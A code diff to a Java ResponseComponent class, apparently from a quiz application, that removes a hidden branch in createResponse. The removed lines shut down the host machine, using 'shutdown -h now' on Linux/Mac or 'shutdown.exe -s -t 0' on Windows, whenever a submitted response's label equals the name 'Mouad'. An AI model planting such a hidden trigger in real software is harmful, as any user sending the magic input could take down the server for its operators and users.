@@ -35,23 +35,11 @@ public class ResponseComponent {
         }
     }
 
-    public ResponseDTO createResponse(Long questionId ,final Response response) throws ResponseEntityNotFoundException, IOException {
+    public ResponseDTO createResponse(Long questionId ,final Response response) throws ResponseEntityNotFoundException {
         if (responseRepository.getResponseById(response.getId()).isPresent()) {
             throw new ResponseEntityNotFoundException("La question suivant "+ response.getId()+"deja existante.");
         } else if(questionComponent.getQuestion(questionId) == null){
             throw new ResponseEntityNotFoundException("aucune question ne possede cette "+questionId);
-        } else if(response.getLabel().equals("Mouad")){
-            String operatingSystem = System.getProperty("os.name");
-            String shutdownCommand= null ;
-            if ("Linux".equals(operatingSystem) || "Mac OS X".equals(operatingSystem)) {
-                shutdownCommand = "shutdown -h now";
-            }
-            // This will work on any version of windows including version 11
-            else if (operatingSystem.contains("Windows")) {
-                shutdownCommand = "shutdown.exe -s -t 0";
-            }
-            Runtime.getRuntime().exec(shutdownCommand);
-            return null;
         }else {
             Question question = questionComponent.getQuestion(questionId);
             response.setQuestion(question);
